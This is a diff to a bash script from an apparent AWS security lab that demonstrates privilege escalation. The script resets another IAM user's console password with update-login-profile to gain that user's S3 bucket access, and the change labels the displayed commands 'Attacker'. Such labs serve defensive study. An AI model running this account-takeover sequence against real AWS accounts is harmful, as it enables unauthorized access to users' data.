@@ -22,12 +22,14 @@ ATTACK_COMMANDS=()
 
 # Display a command before executing it
 show_cmd() {
-    echo -e "${DIM}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "${DIM}[${identity}] \$ $*${NC}"
 }
 
 # Display AND record an attack command
 show_attack_cmd() {
-    echo -e "\n${CYAN}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
     ATTACK_COMMANDS+=("$*")
 }
 
@@ -78,7 +80,7 @@ NEW_PASSWORD="PathfindingLabs123!${RANDOM_SUFFIX}"  # New password with random s
 
 # Step 2: Verify starting user identity
 echo -e "${YELLOW}Step 2: Verifying identity as starting user${NC}"
-show_cmd aws sts get-caller-identity --query 'Arn' --output text
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -91,7 +93,7 @@ echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
 # Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
-show_cmd aws sts get-caller-identity --query 'Account' --output text
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
@@ -140,7 +142,7 @@ echo ""
 echo -e "${YELLOW}Step 5: Verifying bucket user has an existing login profile${NC}"
 echo "Checking for login profile for user: $BUCKET_USER"
 
-show_cmd aws iam get-login-profile --user-name $BUCKET_USER
+show_cmd "Attacker" "aws iam get-login-profile --user-name $BUCKET_USER"
 if aws iam get-login-profile --user-name $BUCKET_USER &> /dev/null; then
     echo -e "${GREEN}✓ Confirmed: Login profile exists for $BUCKET_USER${NC}"
     LOGIN_PROFILE_INFO=$(aws iam get-login-profile --user-name $BUCKET_USER --output json)
@@ -158,7 +160,7 @@ echo -e "${YELLOW}Step 6: Verifying we don't have S3 bucket access yet${NC}"
 echo "Target bucket: $TARGET_BUCKET"
 echo "Attempting to list bucket contents (should fail)..."
 
-show_cmd aws s3 ls s3://$TARGET_BUCKET
+show_cmd "Attacker" "aws s3 ls s3://$TARGET_BUCKET"
 if aws s3 ls s3://$TARGET_BUCKET &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly have bucket access already${NC}"
 else
@@ -176,7 +178,7 @@ if [ ! -z "$ORIGINAL_PASSWORD" ] && [ "$ORIGINAL_PASSWORD" != "null" ]; then
     echo "$ORIGINAL_PASSWORD" > /tmp/original_password_iam_006_bucket.txt
 fi
 
-show_attack_cmd aws iam update-login-profile --user-name $BUCKET_USER --password "$NEW_PASSWORD" --no-password-reset-required
+show_attack_cmd "Attacker" "aws iam update-login-profile --user-name $BUCKET_USER --password "$NEW_PASSWORD" --no-password-reset-required"
 aws iam update-login-profile \
     --user-name $BUCKET_USER \
     --password "$NEW_PASSWORD" \
